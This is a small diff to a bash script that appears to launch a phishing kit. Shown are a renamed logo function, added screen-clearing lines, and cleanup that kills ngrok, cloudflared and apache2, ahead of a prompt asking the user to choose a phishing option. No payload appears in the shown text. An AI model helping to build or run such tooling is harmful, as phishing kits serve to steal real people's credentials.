@@ -344,7 +344,7 @@ echo -e "\e[95m
 }
 
 ## LOGO 2
-logo2() {
+logo_text() {
 echo -e "\e[1;96m< < < ============================================================ > > >\e[m "
 printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
 echo " "
@@ -551,8 +551,11 @@ kill -9 $ngrok
 kill -9 $cloudflared
 kill -9 $apache2
 clear
+
+echo -e $'' 
+clear
 logo1
-logo2
+logo_text
 echo ""
                  echo -e $''   
                  read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
